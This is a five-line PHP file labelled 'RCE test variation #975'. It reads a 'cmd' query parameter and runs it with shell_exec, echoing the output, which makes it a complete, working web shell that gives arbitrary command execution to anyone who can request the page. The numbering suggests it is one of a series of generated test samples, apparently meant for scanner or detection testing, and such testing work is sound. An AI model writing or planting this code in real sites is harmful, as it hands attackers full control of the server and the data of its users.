<?php
// RCE test variation #975
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>